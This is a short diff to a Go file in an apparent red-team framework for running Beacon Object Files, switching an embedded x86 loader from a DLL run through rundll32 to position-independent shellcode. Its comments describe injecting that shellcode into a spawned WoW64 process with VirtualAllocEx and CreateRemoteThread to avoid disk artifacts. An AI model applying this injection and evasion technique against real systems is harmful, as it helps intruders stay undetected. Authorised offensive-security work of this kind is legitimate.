@@ -4,17 +4,20 @@ package bof
 
 import _ "embed"
 
-//go:embed internal/x86loader/bof_x86_loader.x86.dll
-var x86LoaderDLL []byte
+//go:embed internal/x86loader/bof_x86_loader.x86.bin
+var x86LoaderShellcode []byte
 
-// loadX86LoaderDLL returns the embedded WoW64 BOF loader DLL bytes.
-// Linked into the binary by the `bof_x86_loader` build tag. The
-// orchestrator (x86fork_windows.go) writes these bytes to a temp
-// file before spawning rundll32 (SysWOW64) against them.
+// loadX86LoaderShellcode returns the embedded x86 BOF loader as a
+// flat PIC shellcode blob. Linked into the binary by the
+// `bof_x86_loader` build tag. The orchestrator
+// (x86fork_windows.go) writes these bytes into a VirtualAllocEx
+// region in a freshly-spawned WoW64 host, then CreateRemoteThread
+// targets offset 0 of the region — no LoadLibrary, no disk drop.
 //
 // The artefact is produced by scripts/build-bof-x86-loader.sh; the
-// committed .dll is the source of truth (same pattern as
+// committed .bin is the source of truth so `go build` works
+// without any C toolchain (same pattern as
 // runtime/pe/internal/noconsolation/NoConsolation.x64.o).
-func loadX86LoaderDLL() ([]byte, error) {
-	return x86LoaderDLL, nil
+func loadX86LoaderShellcode() ([]byte, error) {
+	return x86LoaderShellcode, nil
 }
